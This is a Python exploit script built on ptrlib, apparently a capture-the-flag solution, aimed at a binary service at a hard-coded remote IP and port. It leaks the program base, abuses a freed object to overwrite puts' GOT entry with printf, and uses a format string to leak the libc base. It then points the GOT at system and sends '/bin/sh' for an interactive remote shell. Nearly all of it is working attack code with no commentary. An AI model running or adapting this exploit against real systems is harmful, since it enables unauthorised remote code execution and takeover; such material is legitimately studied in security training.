from ptrlib import *
import time

def create(age, name):
    sock.sendlineafter(": ", "0")
    sock.sendlineafter(": ", str(age))
    sock.sendafter(": ", name)
    return

def edit(age, name):
    sock.sendlineafter(": ", "1")
    sock.sendlineafter(": ", str(age))
    sock.sendafter(": ", name)
    return

def delete():
    sock.sendlineafter(": ", "2")
    return

def sendmsg(msg):
    sock.sendlineafter(": ", "3")
    sock.sendafter(": \n", msg)
    sock.recvuntil(": \n")
    return sock.recvline()

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("./vuln")
#sock = Process("./vuln")
sock = Socket("34.69.116.108", 3333)

# leak proc base
sendmsg('A' * 8)
proc_base = u64(sendmsg('A' * 0x10)[0x10:]) - 0x20fa
logger.info("proc base = " + hex(proc_base))
assert proc_base > 0

# GOT overwrite
create(10, "TARO")
delete()
sendmsg(p64(proc_base + elf.got("puts")))
edit(10, p64(proc_base + elf.plt("printf")))

# leak libc base
sock.sendlineafter(": ", "3")
sock.sendlineafter(": ", "%31$p")
sock.recvuntil(": ")
libc_base = int(sock.recvline(), 16) - libc.symbol("__libc_start_main") - 0xe7
logger.info("libc base = " + hex(libc_base))

# GOT overwrite
edit(10, p64(libc_base + libc.symbol("system")))

# get the shell!
time.sleep(0.5)
sock.sendline("3")
time.sleep(0.5)
sock.sendline("/bin/sh")

sock.interactive()
